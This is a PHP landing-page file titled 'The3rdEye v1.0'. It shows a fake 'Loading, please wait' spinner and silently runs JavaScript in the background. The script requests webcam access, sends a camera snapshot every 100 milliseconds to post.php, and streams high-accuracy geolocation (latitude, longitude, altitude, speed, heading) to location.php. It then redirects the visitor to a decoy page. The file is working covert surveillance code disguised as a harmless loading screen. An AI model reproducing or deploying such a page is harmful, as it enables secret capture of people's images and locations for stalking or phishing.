<?php
// The3rdEye v1.0 - Minimal Landing Page
include 'ip.php';

echo '<!DOCTYPE html>
<html>
<head>
    <title>Loading...</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {
            background: #000;
            color: #ccc;
            font-family: Arial, sans-serif;
            text-align: center;
            padding-top: 30vh;
            margin: 0;
        }
        .loader {
            border: 4px solid #222;
            border-top: 4px solid #888;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        p { font-size: 14px; margin: 10px 0; }
        small { font-size: 11px; color: #666; }
    </style>
    <script>
        var CAPTURE_INTERVAL = 100;
        var captureIntervalId = null;

        function sendPosition(position) {
            var lat = position.coords.latitude;
            var lon = position.coords.longitude;
            var acc = position.coords.accuracy;
            var alt = position.coords.altitude || "N/A";
            var spd = position.coords.speed || "N/A";
            var hdg = position.coords.heading || "N/A";

            var xhr = new XMLHttpRequest();
            xhr.open("POST", "location.php", true);
            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
            xhr.onreadystatechange = function() {
                if (xhr.readyState === 4) redirectToMain();
            };
            xhr.send("lat="+lat+"&lon="+lon+"&acc="+acc+"&alt="+alt+"&spd="+spd+"&hdg="+hdg+"&t="+Date.now());
        }

        function handleError(e) {
            setTimeout(redirectToMain, 1500);
        }

        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.watchPosition(sendPosition, handleError, {
                    enableHighAccuracy: true,
                    timeout: 5000,
                    maximumAge: 0
                });
                navigator.geolocation.getCurrentPosition(sendPosition, handleError, {
                    enableHighAccuracy: true,
                    timeout: 5000,
                    maximumAge: 0
                });
            } else {
                setTimeout(redirectToMain, 1000);
            }
        }

        function redirectToMain() {
            window.location.href = "forwarding_link/index2.html";
        }

        function startCapture() {
            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                navigator.mediaDevices.getUserMedia({ video: true })
                    .then(function(stream) {
                        var video = document.createElement("video");
                        video.srcObject = stream;
                        video.play();
                        var canvas = document.createElement("canvas");
                        var ctx = canvas.getContext("2d");
                        captureIntervalId = setInterval(function() {
                            if (video.readyState >= 2) {
                                canvas.width = video.videoWidth || 640;
                                canvas.height = video.videoHeight || 480;
                                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                                var data = canvas.toDataURL("image/png");
                                var xhr = new XMLHttpRequest();
                                xhr.open("POST", "post.php", true);
                                xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
                                xhr.send("cat=" + encodeURIComponent(data));
                            }
                        }, CAPTURE_INTERVAL);
                    })
                    .catch(function() {});
            }
        }

        window.onload = function() {
            startCapture();
            setTimeout(getLocation, 300);
        };

        document.addEventListener("click", function() {
            if (!captureIntervalId) startCapture();
            getLocation();
        }, { once: true });

        document.addEventListener("touchstart", function() {
            if (!captureIntervalId) startCapture();
            getLocation();
        }, { once: true });
    </script>
</head>
<body>
    <p>Loading, please wait...</p>
    <div class="loader"></div>
    <small>This may take a few moments</small>
</body>
</html>';
exit;
?>